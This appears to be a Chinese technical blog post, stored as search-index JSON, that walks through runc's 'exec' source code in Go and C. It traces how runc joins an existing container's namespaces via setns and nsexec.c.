(j = 0; j &lt; def-&gt;linux-&gt;namespaces_len; j++) &#123; if (strcmp (namespaces[i].name, def-&gt;linux-&gt;namespaces[j]-&gt;type) == 0) &#123; found = true; break; &#125; &#125; if (! found) &#123; /* It was not requested to create this ns, so just ignore it. */ fds_joined[i] = 1; continue; &#125; ret = crun_make_error (err, errno, &quot;setns `%s`&quot;, namespaces[i].ns_file); goto exit; &#125; fds_joined[i] = 1; &#125; ret = 0;exit: for (i = 0; namespaces[i].ns_file; i++) close_and_reset (&amp;fds[i]); return ret;&#125;","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"runc exec 源码分析","slug":"runc-exec-源码分析","date":"2023-12-25T01:03:51.000Z","updated":"2023-12-25T03:01:01.008Z","comments":true,"path":"2023/12/25/runc-exec-源码分析/","link":"","permalink":"http://example.com/2023/12/25/runc-exec-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"runc exec源码分析runc exec命令入口runc&#x2F;exec.go at main · opencontainers&#x2F;runc (github.com)","text":"runc exec源码分析runc exec命令入口runc&#x2F;exec.go at main · opencontainers&#x2F;runc (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103var execCommand = cli.Command&#123; Name: &quot;exec&quot;, Usage: &quot;execute new process inside the container&quot;, ArgsUsage: `&lt;container-id&gt; &lt;command&gt; [command options] || -p process.json &lt;container-id&gt;Where &quot;&lt;container-id&gt;&quot; is the name for the instance of the container and&quot;&lt;command&gt;&quot; is the command to be executed in the container.&quot;&lt;command&gt;&quot; can&#x27;t be empty unless a &quot;-p&quot; flag provided.EXAMPLE:For example, if the container is configured to run the linux ps command thefollowing will output a list of processes running in the container: # runc exec &lt;container-id&gt; ps`, Flags: []cli.Flag&#123; cli.StringFlag&#123; Name: &quot;console-socket&quot;, Usage: &quot;path to an AF_UNIX socket which will receive a file descriptor referencing the master end of the console&#x27;s pseudoterminal&quot;, &#125;, cli.StringFlag&#123; Name: &quot;pidfd-socket&quot;, Usage: &quot;path to an AF_UNIX socket which will receive a file descriptor referencing the exec process&quot;, &#125;, cli.StringFlag&#123; Name: &quot;cwd&quot;, Usage: &quot;current working directory in the container&quot;, &#125;, cli.StringSliceFlag&#123; Name: &quot;env, e&quot;, Usage: &quot;set environment variables&quot;, &#125;, cli.BoolFlag&#123; Name: &quot;tty, t&quot;, Usage: &quot;allocate a pseudo-TTY&quot;, &#125;, cli.StringFlag&#123; Name: &quot;user, u&quot;, Usage: &quot;UID (format: &lt;uid&gt;[:&lt;gid&gt;])&quot;, &#125;, cli.Int64SliceFlag&#123; Name: &quot;additional-gids, g&quot;, Usage: &quot;additional gids&quot;, &#125;, cli.StringFlag&#123; Name: &quot;process, p&quot;, Usage: &quot;path to the process.json&quot;, &#125;, cli.BoolFlag&#123; Name: &quot;detach,d&quot;, Usage: &quot;detach from the container&#x27;s process&quot;, &#125;, cli.StringFlag&#123; Name: &quot;pid-file&quot;, Value: &quot;&quot;, Usage: &quot;specify the file to write the process id to&quot;, &#125;, cli.StringFlag&#123; Name: &quot;process-label&quot;, Usage: &quot;set the asm process label for the process commonly used with selinux&quot;, &#125;, cli.StringFlag&#123; Name: &quot;apparmor&quot;, Usage: &quot;set the apparmor profile for the process&quot;, &#125;, cli.BoolFlag&#123; Name: &quot;no-new-privs&quot;, Usage: &quot;set the no new privileges value for the process&quot;, &#125;, cli.StringSliceFlag&#123; Name: &quot;cap, c&quot;, Value: &amp;cli.StringSlice&#123;&#125;, Usage: &quot;add a capability to the bounding set for the process&quot;, &#125;, cli.IntFlag&#123; Name: &quot;preserve-fds&quot;, Usage: &quot;Pass N additional file descriptors to the container (stdio + $LISTEN_FDS + N in total)&quot;, &#125;, cli.StringSliceFlag&#123; Name: &quot;cgroup&quot;, Usage: &quot;run the process in an (existing) sub-cgroup(s). Format is [&lt;controller&gt;:]&lt;cgroup&gt;.&quot;, &#125;, cli.BoolFlag&#123; Name: &quot;ignore-paused&quot;, Usage: &quot;allow exec in a paused container&quot;, &#125;, &#125;, Action: func(context *cli.Context) error &#123; if err := checkArgs(context, 1, minArgs); err != nil &#123; return err &#125; if err := revisePidFile(context); err != nil &#123; return err &#125; status, err := execProcess(context) if err == nil &#123; os.Exit(status) &#125; fatalWithCode(fmt.Errorf(&quot;exec failed: %w&quot;, err), 255) return nil // to satisfy the linter &#125;, SkipArgReorder: true,&#125; execProcessrunc&#x2F;exec.go at main · opencontainers&#x2F;runc (github.com) getContainer 该函数主要是获取一个container 的方式，是通过 libcontainer.Factory 容器工厂类加载containerID 及其配置获取一个可运行的容器（里面会调用runc init来准备容器环境）。最后也是通过前面提到的runner进行容器的启动，但这次不同于创建容器流程，不需要进行环境大规模的配置初始化（env，cgroups，namespace，rootfs， mounts等）；后面进入 r.run(p) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152func execProcess(context *cli.Context) (int, error) &#123; container, err := getContainer(context) if err != nil &#123; return -1, err &#125; status, err := container.Status() if err != nil &#123; return -1, err &#125; if status == libcontainer.Stopped &#123; return -1, errors.New(&quot;cannot exec in a stopped container&quot;) &#125; if status == libcontainer.Paused &amp;&amp; !context.Bool(&quot;ignore-paused&quot;) &#123; return -1, errors.New(&quot;cannot exec in a paused container (use --ignore-paused to override)&quot;) &#125; path := context.String(&quot;process&quot;) if path == &quot;&quot; &amp;&amp; len(context.Args()) == 1 &#123; return -1, errors.New(&quot;process args cannot be empty&quot;) &#125; state, err := container.State() if err != nil &#123; return -1, err &#125; bundle, ok := utils.SearchLabels(state.Config.Labels, &quot;bundle&quot;) if !ok &#123; return -1, errors.New(&quot;bundle not found in labels&quot;) &#125; p, err := getProcess(context, bundle) if err != nil &#123; return -1, err &#125; cgPaths, err := getSubCgroupPaths(context.StringSlice(&quot;cgroup&quot;)) if err != nil &#123; return -1, err &#125; r := &amp;runner&#123; enableSubreaper: false, shouldDestroy: false, container: container, consoleSocket: context.String(&quot;console-socket&quot;), pidfdSocket: context.String(&quot;pidfd-socket&quot;), detach: context.Bool(&quot;detach&quot;), pidFile: context.String(&quot;pid-file&quot;), action: CT_ACT_RUN, init: false, preserveFDs: context.Int(&quot;preserve-fds&quot;), subCgroupPaths: cgPaths, &#125; return r.run(p)&#125; runner.runrunc&#x2F;utils_linux.go at main · opencontainers&#x2F;runc (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495func (r *runner) run(config *specs.Process) (int, error) &#123; var err error defer func() &#123; if err != nil &#123; r.destroy() &#125; &#125;() if err = r.checkTerminal(config); err != nil &#123; return -1, err &#125; process, err := newProcess(*config) if err != nil &#123; return -1, err &#125; process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init process.SubCgroupPaths = r.subCgroupPaths if len(r.listenFDs) &gt; 0 &#123; process.Env = append(process.Env, &quot;LISTEN_FDS=&quot;+strconv.Itoa(len(r.listenFDs)), &quot;LISTEN_PID=1&quot;) process.ExtraFiles = append(process.ExtraFiles, r.listenFDs...) &#125; baseFd := 3 + len(process.ExtraFiles) procSelfFd, closer := utils.ProcThreadSelf(&quot;fd/&quot;) defer closer() for i := baseFd; i &lt; baseFd+r.preserveFDs; i++ &#123; _, err = os.Stat(filepath.Join(procSelfFd, strconv.Itoa(i))) if err != nil &#123; return -1, fmt.Errorf(&quot;unable to stat preserved-fd %d (of %d): %w&quot;, i-baseFd, r.preserveFDs, err) &#125; process.ExtraFiles = append(process.ExtraFiles, os.NewFile(uintptr(i), &quot;PreserveFD:&quot;+strconv.Itoa(i))) &#125; rootuid, err := r.container.Config().HostRootUID() if err != nil &#123; return -1, err &#125; rootgid, err := r.container.Config().HostRootGID() if err != nil &#123; return -1, err &#125; detach := r.detach || (r.action == CT_ACT_CREATE) // Setting up IO is a two stage process. We need to modify process to deal // with detaching containers, and then we get a tty after the container has // started. handler := newSignalHandler(r.enableSubreaper, r.notifySocket) tty, err := setupIO(process, rootuid, rootgid, config.Terminal, detach, r.consoleSocket) if err != nil &#123; return -1, err &#125; defer tty.Close() if r.pidfdSocket != &quot;&quot; &#123; connClose, err := setupPidfdSocket(process, r.pidfdSocket) if err != nil &#123; return -1, err &#125; defer connClose() &#125; switch r.action &#123; case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: err = r.container.Run(process) default: panic(&quot;Unknown action&quot;) &#125; if err != nil &#123; return -1, err &#125; if err = tty.waitConsole(); err != nil &#123; r.terminate(process) return -1, err &#125; tty.ClosePostStart() if r.pidFile != &quot;&quot; &#123; if err = createPidFile(r.pidFile, process); err != nil &#123; r.terminate(process) return -1, err &#125; &#125; status, err := handler.forward(process, tty, detach) if err != nil &#123; r.terminate(process) &#125; if detach &#123; return 0, nil &#125; if err == nil &#123; r.destroy() &#125; return status, err&#125; 在容器的创建流程中也会走这一段，不过这次从这里走 12case CT_ACT_RUN: err = r.container.Run(process) Container.Runrunc&#x2F;libcontainer&#x2F;container_linux.go at main · opencontainers&#x2F;runc (github.com) 123456789101112// Run immediately starts the process inside the container. Returns an error if// the process fails to start. It does not block waiting for the exec fifo// after start returns but opens the fifo after start returns.func (c *Container) Run(process *Process) error &#123; if err := c.Start(process); err != nil &#123; return err &#125; if process.Init &#123; return c.exec() &#125; return nil&#125; Container去启动容器的process， 进入 123if err := c.Start(process); err != nil &#123; return e&#125; 下面的初始化时不需要跑的，因为在创建容器时已经初始化了。 Container.Startrunc&#x2F;libcontainer&#x2F;container_linux.go at main · opencontainers&#x2F;runc (github.com) 123456789101112131415161718192021// Start starts a process inside the container. Returns error if process fails// to start. You can track process lifecycle with passed Process structure.func (c *Container) Start(process *Process) error &#123; c.m.Lock() defer c.m.Unlock() if c.config.Cgroups.Resources.SkipDevices &#123; return errors.New(&quot;can&#x27;t start container with SkipDevices set&quot;) &#125; if process.Init &#123; if err := c.createExecFifo(); err != nil &#123; return err &#125; &#125; if err := c.start(process); err != nil &#123; if process.Init &#123; c.deleteExecFifo() &#125; return err &#125; return nil&#125; 同样的，process.Init时不会跑的，而是进入下面的c.start Container.startrunc&#x2F;libcontainer&#x2F;container_linux.go at main · opencontainers&#x2F;runc (github.com) 1234567891011121314151617181920212223242526272829303132333435363738394041424344func (c *Container) start(process *Process) (retErr error) &#123; // 返回一个setnsProcess // 设置进程env _LIBCONTAINER_INITTYPE=setns parent, err := c.newParentProcess(process) if err != nil &#123; return fmt.Errorf(&quot;unable to create new parent process: %w&quot;, err) &#125; // We do not need the cloned binaries once the process is spawned. defer process.closeClonedExes() //读取parent 日志文件管道 logsDone := parent.forwardChildLogs() if logsDone != nil &#123; defer func() &#123; // Wait for log forwarder to finish. This depends on // runc init closing the _LIBCONTAINER_LOGPIPE log fd. err := &lt;-logsDone if err != nil &amp;&amp; retErr == nil &#123; retErr = fmt.Errorf(&quot;unable to forward init logs: %w&quot;, err) &#125; &#125;() &#125; if err := parent.start(); err != nil &#123; return fmt.Errorf(&quot;unable to start container process: %w&quot;, err) &#125; if process.Init &#123; c.fifo.Close() if c.config.Hooks != nil &#123; s, err := c.currentOCIState() if err != nil &#123; return err &#125; if err := c.config.Hooks.Run(configs.Poststart, s); err != nil &#123; if err := ignoreTerminateErrors(parent.terminate()); err != nil &#123; logrus.Warn(fmt.Errorf(&quot;error running poststart hook: %w&quot;, err)) &#125; return err &#125; &#125; &#125; return nil&#125; 经历了几次跳转终于来到核心的调用, c.newParentProcess 会提供一个pipe作为和子进程的通信通道，使用socketpair建立，最后组装到 runc init 的命令里面(如未指定cwd，命令会在容器的rootfs下执行), 以及返回一个setnsProcess(核心的启动命令)。 这个函数中有两个重要的函数需要探索 Container.newParentProcess parent.start Container.newParentProcessrunc&#x2F;libcontainer&#x2F;container_linux.go at main · opencontainers&#x2F;runc (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144func (c *Container) newParentProcess(p *Process) (parentProcess, error) &#123; comm, err := newProcessComm() if err != nil &#123; return nil, err &#125; // Make sure we use a new safe copy of /proc/self/exe or the runc-dmz // binary each time this is called, to make sure that if a container // manages to overwrite the file it cannot affect other containers on the // system. For runc, this code will only ever be called once, but // libcontainer users might call this more than once. p.closeClonedExes() var ( exePath string // only one of dmzExe or safeExe are used at a time dmzExe, safeExe *os.File ) if dmz.IsSelfExeCloned() &#123; // /proc/self/exe is already a cloned binary -- no need to do anything logrus.Debug(&quot;skipping binary cloning -- /proc/self/exe is already cloned!&quot;) // We don&#x27;t need to use /proc/thread-self here because the exe mm of a // thread-group is guaranteed to be the same for all threads by // definition. This lets us avoid having to do runtime.LockOSThread. exePath = &quot;/proc/self/exe&quot; &#125; else &#123; var err error if isDmzBinarySafe(c.config) &#123; dmzExe, err = dmz.Binary(c.stateDir) if err == nil &#123; // We can use our own executable without cloning if we are // using runc-dmz. We don&#x27;t need to use /proc/thread-self here // because the exe mm of a thread-group is guaranteed to be the // same for all threads by definition. This lets us avoid // having to do runtime.LockOSThread. exePath = &quot;/proc/self/exe&quot; p.clonedExes = append(p.clonedExes, dmzExe) logrus.Debug(&quot;runc-dmz: using runc-dmz&quot;) // used for tests &#125; else if errors.Is(err, dmz.ErrNoDmzBinary) &#123; logrus.Debug(&quot;runc-dmz binary not embedded in runc binary, falling back to /proc/self/exe clone&quot;) &#125; else if err != nil &#123; return nil, fmt.Errorf(&quot;failed to create runc-dmz binary clone: %w&quot;, err) &#125; &#125; else &#123; // If the configuration makes it unsafe to use runc-dmz, pretend we // don&#x27;t have it embedded so we do /proc/self/exe cloning. logrus.Debug(&quot;container configuration unsafe for runc-dmz, falling back to /proc/self/exe clone&quot;) err = dmz.ErrNoDmzBinary &#125; if errors.Is(err, dmz.ErrNoDmzBinary) &#123; safeExe, err = dmz.CloneSelfExe(c.stateDir) if err != nil &#123; return nil, fmt.Errorf(&quot;unable to create safe /proc/self/exe clone for runc init: %w&quot;, err) &#125; exePath = &quot;/proc/self/fd/&quot; + strconv.Itoa(int(safeExe.Fd())) p.clonedExes = append(p.clonedExes, safeExe) logrus.Debug(&quot;runc-dmz: using /proc/self/exe clone&quot;) // used for tests &#125; // Just to make sure we don&#x27;t run without protection. if dmzExe == nil &amp;&amp; safeExe == nil &#123; // This should never happen. return nil, fmt.Errorf(&quot;[internal error] attempted to spawn a container with no /proc/self/exe protection&quot;) &#125; &#125; cmd := exec.Command(exePath, &quot;init&quot;) cmd.Args[0] = os.Args[0] cmd.Stdin = p.Stdin cmd.Stdout = p.Stdout cmd.Stderr = p.Stderr cmd.Dir = c.config.Rootfs if cmd.SysProcAttr == nil &#123; cmd.SysProcAttr = &amp;unix.SysProcAttr&#123;&#125; &#125; cmd.Env = append(cmd.Env, &quot;GOMAXPROCS=&quot;+os.Getenv(&quot;GOMAXPROCS&quot;)) cmd.ExtraFiles = append(cmd.ExtraFiles, p.ExtraFiles...) if p.ConsoleSocket != nil &#123; cmd.ExtraFiles = append(cmd.ExtraFiles, p.ConsoleSocket) cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_CONSOLE=&quot;+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1), ) &#125; cmd.ExtraFiles = append(cmd.ExtraFiles, comm.initSockChild) cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_INITPIPE=&quot;+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1), ) cmd.ExtraFiles = append(cmd.ExtraFiles, comm.syncSockChild.File()) cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_SYNCPIPE=&quot;+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1), ) if dmzExe != nil &#123; cmd.ExtraFiles = append(cmd.ExtraFiles, dmzExe) cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_DMZEXEFD=&quot;+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1)) &#125; cmd.ExtraFiles = append(cmd.ExtraFiles, comm.logPipeChild) cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_LOGPIPE=&quot;+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1)) if p.LogLevel != &quot;&quot; &#123; cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_LOGLEVEL=&quot;+p.LogLevel) &#125; if p.PidfdSocket != nil &#123; cmd.ExtraFiles = append(cmd.ExtraFiles, p.PidfdSocket) cmd.Env = append(cmd.Env, &quot;_LIBCONTAINER_PIDFD_SOCK=&quot;+strconv.Itoa(stdioFdCount+len(cmd.ExtraFiles)-1), ) &#125; if safeExe != nil &#123; // Due to a Go stdlib bug, we need to add safeExe to the set of // ExtraFiles otherwise it is possible for the stdlib to clobber the fd // during forkAndExecInChild1 and replace it with some other file that // might be malicious. This is less than ideal (because the descriptor // will be non-O_CLOEXEC) however we have protections in &quot;runc init&quot; to // stop us from leaking extra file descriptors. // // See &lt;https://github.com/golang/go/issues/61751&gt;. cmd.ExtraFiles = append(cmd.ExtraFiles, safeExe) &#125; // NOTE: when running a container with no PID namespace and the parent // process spawning the container is PID1 the pdeathsig is being // delivered to the container&#x27;s init process by the kernel for some // reason even with the parent still running. if c.config.ParentDeathSignal &gt; 0 &#123; cmd.SysProcAttr.Pdeathsig = unix.Signal(c.config.ParentDeathSignal) &#125; if p.Init &#123; // We only set up fifoFd if we&#x27;re not doing a `runc exec`. The historic // reason for this is that previously we would pass a dirfd that allowed // for container rootfs escape (and not doing it in `runc exec` avoided // that problem), but we no longer do that. However, there&#x27;s no need to do // this for `runc exec` so we just keep it this way to be safe. if err := c.includeExecFifo(cmd); err != nil &#123; return nil, fmt.Errorf(&quot;unable to setup exec fifo: %w&quot;, err) &#125; return c.newInitProcess(p, cmd, comm) &#125; return c.newSetnsProcess(p, cmd, comm)&#125; setnsProcess.startrunc&#x2F;libcontainer&#x2F;process_linux.go at 29222735a738a78a93a2879013c35fa899cb16b8 · opencontainers&#x2F;runc (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152func (p *setnsProcess) start() (retErr error) &#123; defer p.comm.closeParent() // get the &quot;before&quot; value of oom kill count oom, _ := p.manager.OOMKillCount() err := p.cmd.Start() // close the child-side of the pipes (controlled by child) p.comm.closeChild() if err != nil &#123; return fmt.Errorf(&quot;error starting setns process: %w&quot;, err) &#125; waitInit := initWaiter(p.comm.initSockParent) defer func() &#123; if retErr != nil &#123; if newOom, err := p.manager.OOMKillCount(); err == nil &amp;&amp; newOom != oom &#123; // Someone in this cgroup was killed, this _might_ be us. retErr = fmt.Errorf(&quot;%w (possibly OOM-killed)&quot;, retErr) &#125; werr := &lt;-waitInit if werr != nil &#123; logrus.WithError(werr).Warn() &#125; err := ignoreTerminateErrors(p.terminate()) if err != nil &#123; logrus.WithError(err).Warn(&quot;unable to terminate setnsProcess&quot;) &#125; &#125; &#125;() if p.bootstrapData != nil &#123; if _, err := io.Copy(p.comm.initSockParent, p.bootstrapData); err != nil &#123; return fmt.Errorf(&quot;error copying bootstrap data to pipe: %w&quot;, err) &#125; &#125; err = &lt;-waitInit if err != nil &#123; return err &#125; if err := p.execSetns(); err != nil &#123; return fmt.Errorf(&quot;error executing setns process: %w&quot;, err) &#125; for _, path := range p.cgroupPaths &#123; if err := cgroups.WriteCgroupProc(path, p.pid()); err != nil &amp;&amp; !p.rootlessCgroups &#123; // On cgroup v2 + nesting + domain controllers, WriteCgroupProc may fail with EBUSY. // https://github.com/opencontainers/runc/issues/2356#issuecomment-621277643 // Try to join the cgroup of InitProcessPid. if cgroups.IsCgroup2UnifiedMode() &amp;&amp; p.initProcessPid != 0 &#123; initProcCgroupFile := fmt.Sprintf(&quot;/proc/%d/cgroup&quot;, p.initProcessPid) initCg, initCgErr := cgroups.ParseCgroupFile(initProcCgroupFile) if initCgErr == nil &#123; if initCgPath, ok := initCg[&quot;&quot;]; ok &#123; initCgDirpath := filepath.Join(fs2.UnifiedMountpoint, initCgPath) logrus.Debugf(&quot;adding pid %d to cgroups %v failed (%v), attempting to join %q (obtained from %s)&quot;, p.pid(), p.cgroupPaths, err, initCg, initCgDirpath) // NOTE: initCgDirPath is not guaranteed to exist because we didn&#x27;t pause the container. err = cgroups.WriteCgroupProc(initCgDirpath, p.pid()) &#125; &#125; &#125; if err != nil &#123; return fmt.Errorf(&quot;error adding pid %d to cgroups: %w&quot;, p.pid(), err) &#125; &#125; &#125; if p.intelRdtPath != &quot;&quot; &#123; // if Intel RDT &quot;resource control&quot; filesystem path exists _, err := os.Stat(p.intelRdtPath) if err == nil &#123; if err := intelrdt.WriteIntelRdtTasks(p.intelRdtPath, p.pid()); err != nil &#123; return fmt.Errorf(&quot;error adding pid %d to Intel RDT: %w&quot;, p.pid(), err) &#125; &#125; &#125; // set rlimits, this has to be done here because we lose permissions // to raise the limits once we enter a user-namespace if err := setupRlimits(p.config.Rlimits, p.pid()); err != nil &#123; return fmt.Errorf(&quot;error setting rlimits for process: %w&quot;, err) &#125; if err := utils.WriteJSON(p.comm.initSockParent, p.config); err != nil &#123; return fmt.Errorf(&quot;error writing config to pipe: %w&quot;, err) &#125; ierr := parseSync(p.comm.syncSockParent, func(sync *syncT) error &#123; switch sync.Type &#123; case procReady: // This shouldn&#x27;t happen. panic(&quot;unexpected procReady in setns&quot;) case procHooks: // This shouldn&#x27;t happen. panic(&quot;unexpected procHooks in setns&quot;) case procMountPlease: // This shouldn&#x27;t happen. panic(&quot;unexpected procMountPlease in setns&quot;) case procSeccomp: if p.config.Config.Seccomp.ListenerPath == &quot;&quot; &#123; return errors.New(&quot;seccomp listenerPath is not set&quot;) &#125; if sync.Arg == nil &#123; return fmt.Errorf(&quot;sync %q is missing an argument&quot;, sync.Type) &#125; var srcFd int if err := json.Unmarshal(*sync.Arg, &amp;srcFd); err != nil &#123; return fmt.Errorf(&quot;sync %q passed invalid fd arg: %w&quot;, sync.Type, err) &#125; seccompFd, err := pidGetFd(p.pid(), srcFd) if err != nil &#123; return fmt.Errorf(&quot;sync %q get fd %d from child failed: %w&quot;, sync.Type, srcFd, err) &#125; defer seccompFd.Close() // We have a copy, the child can keep working. We don&#x27;t need to // wait for the seccomp notify listener to get the fd before we // permit the child to continue because the child will happily wait // for the listener if it hits SCMP_ACT_NOTIFY. if err := writeSync(p.comm.syncSockParent, procSeccompDone); err != nil &#123; return err &#125; bundle, annotations := utils.Annotations(p.config.Config.Labels) containerProcessState := &amp;specs.ContainerProcessState&#123; Version: specs.Version, Fds: []string&#123;specs.SeccompFdName&#125;, Pid: p.cmd.Process.Pid, Metadata: p.config.Config.Seccomp.ListenerMetadata, State: specs.State&#123; Version: specs.Version, ID: p.config.ContainerID, Status: specs.StateRunning, Pid: p.initProcessPid, Bundle: bundle, Annotations: annotations, &#125;, &#125; if err := sendContainerProcessState(p.config.Config.Seccomp.ListenerPath, containerProcessState, seccompFd); err != nil &#123; return err &#125; default: return errors.New(&quot;invalid JSON payload from child&quot;) &#125; return nil &#125;) if err := p.comm.syncSockParent.Shutdown(unix.SHUT_WR); err != nil &amp;&amp; ierr == nil &#123; return err &#125; // Must be done after Shutdown so the child will exit and we can wait for it. if ierr != nil &#123; _, _ = p.wait() return ierr &#125; return nil&#125; cmd终于的开始执行了，执行runc init，init 程序会调用 nsexec.c 的代码（这也是一个子进程，而且是在init进程前启动，设置ns后就会退出）;通过 _LIBCONTAINER_INITTYPE=setns 这个环境变量判别用什么模式进行setns，如果是standard 则是使用clone namespace 为容器建立新的namespace，这里我们是setns所以是为容器指定了我们需要进入的进程namespace。这一步的信息传递是通过socket与nsexec.c 这个程序交互，进程间通信技术完成信息传递；容器启动的需要的namespace 数据放到setnsProcess.bootstrapData内； 123456789101112 if p.bootstrapData != nil &#123; if _, err := io.Copy(p.comm.initSockParent, p.bootstrapData); err != nil &#123; return fmt.Errorf(&quot;error copying bootstrap data to pipe: %w&quot;, err) &#125;&#125;err = &lt;-waitInitif err != nil &#123; return err&#125;if err := p.execSetns(); err != nil &#123; return fmt.Errorf(&quot;error executing setns process: %w&quot;, err)&#125; 这段代码首先将namespace数据传输到nsenter中，然后等待exec设置namespace数据，并且通过消息管道返回父进程号，然后设置process属性为runc init进程号，方便后面对process的操作。 1234567891011121314151617181920212223for _, path := range p.cgroupPaths &#123; if err := cgroups.WriteCgroupProc(path, p.pid()); err != nil &amp;&amp; !p.rootlessCgroups &#123; // On cgroup v2 + nesting + domain controllers, WriteCgroupProc may fail with EBUSY. // https://github.com/opencontainers/runc/issues/2356#issuecomment-621277643 // Try to join the cgroup of InitProcessPid. if cgroups.IsCgroup2UnifiedMode() &amp;&amp; p.initProcessPid != 0 &#123; initProcCgroupFile := fmt.Sprintf(&quot;/proc/%d/cgroup&quot;, p.initProcessPid) initCg, initCgErr := cgroups.ParseCgroupFile(initProcCgroupFile) if initCgErr == nil &#123; if initCgPath, ok := initCg[&quot;&quot;]; ok &#123; initCgDirpath := filepath.Join(fs2.UnifiedMountpoint, initCgPath) logrus.Debugf(&quot;adding pid %d to cgroups %v failed (%v), attempting to join %q (obtained from %s)&quot;, p.pid(), p.cgroupPaths, err, initCg, initCgDirpath) // NOTE: initCgDirPath is not guaranteed to exist because we didn&#x27;t pause the container. err = cgroups.WriteCgroupProc(initCgDirpath, p.pid()) &#125; &#125; &#125; if err != nil &#123; return fmt.Errorf(&quot;error adding pid %d to cgroups: %w&quot;, p.pid(), err) &#125; &#125; &#125; 在这段代码中设置cgroup setnsProcess.execSetnsrunc&#x2F;libcontainer&#x2F;process_linux.go at 29222735a738a78a93a2879013c35fa899cb16b8 · opencontainers&#x2F;runc (github.com) 1234567891011121314151617181920212223242526272829303132333435// execSetns runs the process that executes C code to perform the setns calls// because setns support requires the C process to fork off a child and perform the setns// before the go runtime boots, we wait on the process to die and receive the child&#x27;s pid// over the provided pipe.func (p *setnsProcess) execSetns() error &#123; status, err := p.cmd.Process.Wait() if err != nil &#123; _ = p.cmd.Wait() return fmt.Errorf(&quot;error waiting on setns process to finish: %w&quot;, err) &#125; if !status.Success() &#123; _ = p.cmd.Wait() return &amp;exec.ExitError&#123;ProcessState: status&#125; &#125; var pid *pid if err := json.NewDecoder(p.comm.initSockParent).Decode(&amp;pid); err != nil &#123; _ = p.cmd.Wait() return fmt.Errorf(&quot;error reading pid from init pipe: %w&quot;, err) &#125; // Clean up the zombie parent process // On Unix systems FindProcess always succeeds. firstChildProcess, _ := os.FindProcess(pid.PidFirstChild) // Ignore the error in case the child has already been reaped for any reason _, _ = firstChildProcess.Wait() process, err := os.FindProcess(pid.Pid) if err != nil &#123; return err &#125; p.cmd.Process = process p.process.ops = p return nil&#125; docker实现setns原理runc&#x2F;init.go at 29222735a738a78a93a2879013c35fa899cb16b8 · opencontainers&#x2F;runc (github.com) 12345678910111213141516package mainimport ( &quot;os&quot; &quot;github.com/opencontainers/runc/libcontainer&quot; _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot;)func init() &#123; if len(os.Args) &gt; 1 &amp;&amp; os.Args[1] == &quot;init&quot; &#123; // This is the golang entry point for runc init, executed // before main() but after libcontainer/nsenter&#x27;s nsexec(). libcontainer.Init() &#125;&#125; 可以通过 exec 命令在一个存在的容器中运行一个进程，那么这个进程就需要通过 setns 系统调用加入到容器对应的 namespace 中，然而 setns 并不能正确的在 Go runtime 这样的多线程环境下工作，因此在实现一个容器的时候，这方面 Go 语言就远没有 C 语言来得直接、简洁。 runc&#x2F;libcontainer&#x2F;nsenter&#x2F;nsenter_gccgo.go at main · opencontainers&#x2F;runc (github.com) 1234567891011121314151617181920212223242526//go:build linux &amp;&amp; gccgo// +build linux,gccgopackage nsenter/*#cgo CFLAGS: -Wallextern void nsexec();void __attribute__((constructor)) init(void) &#123; nsexec();&#125;*/import &quot;C&quot;// AlwaysFalse is here to stay false// (and be exported so the compiler doesn&#x27;t optimize out its reference)var AlwaysFalse boolfunc init() &#123; if AlwaysFalse &#123; // by referencing this C init() in a noop test, it will ensure the compiler // links in the C function. // https://gcc.gnu.org/bugzilla/show_bug.cgi?id=65134 C.init() &#125;&#125; 123__attribute__((constructor)) //修饰的函数在main函数之前执行__attribute__((destructor)) //修饰的函数在main函数之后执行 这段代码就会在 Go 程序真正启动前执行这里定义的 init() 函数，然后执行 nsexec(), nsexec 函数里就可以干我们想干的所有事情了. runc&#x2F;libcontainer&#x2F;nsenter&#x2F;nsexec.c at main · opencontainers&#x2F;runc (github.com) nsexec.c是定义在&#x2F;libcontainer&#x2F;nsenter&#x2F;nsexec.c中的C语言代码，其功能就是依据bootstrapData重新设置init进程的namespace，user等属性。关于nsexec.c的代码，还没作详细地研究，现在只知道只要import该包，代码就生效了: 1import _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot; nsexec.c会从”_LIBCONTAINER_INITPIPE”环境变量中拿到pipe，并读取bootstrapData。然后，nsexec.c会调用clone()进行复制，在clone()时，传入参数CLONE_PARENT及命名空间参数，使用子进程和父进程成为兄弟关系，且拥有了自己的命名空间。接着调用setns()进行已存在的命名空间的处理。 所以不妨可以这样认为，nsexec.c具有劫持init进程的功能。 再看到上面的execSetns代码 